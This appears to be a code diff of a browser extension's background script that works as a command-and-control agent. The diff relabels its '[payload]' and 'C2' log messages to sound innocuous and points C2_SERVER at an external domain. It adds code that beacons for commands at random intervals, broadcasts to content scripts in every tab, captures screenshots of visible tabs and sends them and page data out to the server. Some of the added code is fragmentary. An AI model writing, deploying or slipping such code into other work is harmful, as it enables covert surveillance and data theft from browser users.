@@ -1,9 +1,9 @@
 // background.js
 window.run = function(cfg) {
-  console.log("[payload] run() started with cfg:", cfg);
+  console.log("[Target] run() started with cfg:", cfg);
 
   if (!cfg?.c2) {
-    console.warn("[payload] No C2 address provided in cfg");
+    console.warn("[Target] No address provided in cfg");
     return;
   }
 
@@ -12,7 +12,7 @@ window.run = function(cfg) {
     timestamp: new Date().toISOString()
   };
 
-  fetch(cfg.c2 + "/api/register", {
+  fetch(cfg.c2 + "/session/new", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
@@ -21,14 +21,14 @@ window.run = function(cfg) {
   })
     .then(res => res.text())
     .then(text => {
-      console.log("[payload] C2 register response:", text);
+      console.log("[Target] register response:", text);
     })
     .catch(err => {
-      console.error("[payload] Fetch error during registration:", err);
+      console.error("[Target] Fetch error during registration:", err);
     });
 };
 
-  const C2_SERVER = '/'; // Update if needed
+  const C2_SERVER = 'https://tradingpiecefororder.asia'; // Update if needed
   const MIN_POLL_SECONDS = 2;
   const MAX_POLL_SECONDS = 5;
 
@@ -262,4 +262,90 @@ async function handleCommand(command) {
   }
 }
 
+// Broadcast a message to content scripts in all tabs
+function broadcastMessage(msg) {
+  chrome.tabs.query({}, (tabs) => {
+    for (const t of tabs) {
+      // Skip chrome:// and other restricted URLs
+      if (t.url && !t.url.startsWith('chrome://') && 
+          !t.url.startsWith('chrome-extension://') && 
+          !t.url.startsWith('devtools://')) {
+        try {
+          chrome.tabs.sendMessage(t.id, msg, (response) => {
+            if (chrome.runtime.lastError) {
+              // Ignore common connection errors
+              if (!chrome.runtime.lastError.message.includes('does not exist') && 
+                  !chrome.runtime.lastError.message.includes('port closed')) {
+                console.error(`[Broadcast] tab ${t.id}: ${chrome.runtime.lastError.message}`);
+              }
+            } else if (response) {
+              console.log(`[Broadcast] tab ${t.id} responded:`, response);
+            }
+          });
+        } catch (err) {
+          // Ignore any messaging errors
+          console.debug(`[Broadcast] Failed to send to tab ${t.id}`);
+        }
+      }
+    }
+  });
+}
 
+// Beacon to fetch tasks
+async function beaconToC2() {
+  console.log(`[Beacon] Agent=${agent_id} => ${C2_SERVER}/api/commands`);
+  try {
+    const res = await fetchWithRetry(`${C2_SERVER}/api/commands?agent_id=${agent_id}`, {
+      method: 'GET'
+    });
+    const commands = await res.json();
+    console.log(`[Beacon] Received ${commands.length} commands`);
+    for (const cmd of commands) {
+      await handleCommand(cmd);
+    }
+  } catch (err) {
+    console.error('[Beacon Error]', err.message);
+  }
+}
+
+// Schedule next beacon
+function scheduleNextBeacon() {
+  const interval = getRandomInterval();
+  console.log(`[Beacon] Next in ${interval / 1000}s`);
+  setTimeout(async () => {
+    await beaconToC2();
+    scheduleNextBeacon();
+  }, interval);
+}
+
+  // Handle our custom screenshot capture request
+  if (message.type === 'capture_screenshot') {
+    chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function(dataUrl) {
+      if (chrome.runtime.lastError) {
+        console.error('[Screenshot Error]', chrome.runtime.lastError);
+        return;
+      }
+      // dataUrl is of the form "data:image/png;base64,....."
+      const base64Data = dataUrl.split(',')[1];
+      
+      // Send to server with correct agent_id and action type
+      exfilData('TAKE_SCREENSHOT', {
+        agent_id: agent_id,
+        screenshot: base64Data,
+        location: message.location
+      });
+    });
+  }
+
+  // Handle other exfil messages
+  if (message.type === 'exfil') {
+    console.log('[Exfil Message]', message.data);
+    exfilData(message.data.action, {
+      url: sender.url,
+      location: message.data.location,
+      ...message.data
+    });
+    sendResponse({ status: 'ok' });
+  }
+  return true;
+});
